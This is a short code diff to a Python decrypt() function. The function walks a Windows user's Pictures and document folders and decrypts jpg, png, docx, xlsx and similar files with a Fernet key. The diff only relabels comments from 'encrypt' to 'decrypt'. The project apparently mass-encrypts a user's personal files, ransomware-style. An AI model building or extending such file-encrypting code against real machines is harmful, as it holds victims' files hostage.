@@ -26,13 +26,13 @@ def decrypt():
             with open(f_name, "wb") as file:
                 file.write(decrypted_data)
 
-            # Get pictures to encrypt
+            # Get pictures to decrypt
             path = 'C:/Users/' + usr + '/Pictures'
         for f_name in glob.glob(path + '/**/*.jpg', recursive=True) \
                       + glob.glob(path + '/**/*.jpeg', recursive=True) \
                       + glob.glob(path + '/**/*.png', recursive=True) \
                       + glob.glob(path + '/**/*.svg', recursive=True):
-            # Start encryption
+            # Start decryption
             k = key
             f = Fernet(k)
 
@@ -48,7 +48,7 @@ def decrypt():
                       + glob.glob(path + '/**/*.docx', recursive=True) \
                       + glob.glob(path + '/**/*.ppt', recursive=True) \
                       + glob.glob(path + '/**/*.xlsx', recursive=True):
-            # Start encryption
+            # Start decryption
             k = key
             f = Fernet(k)
 
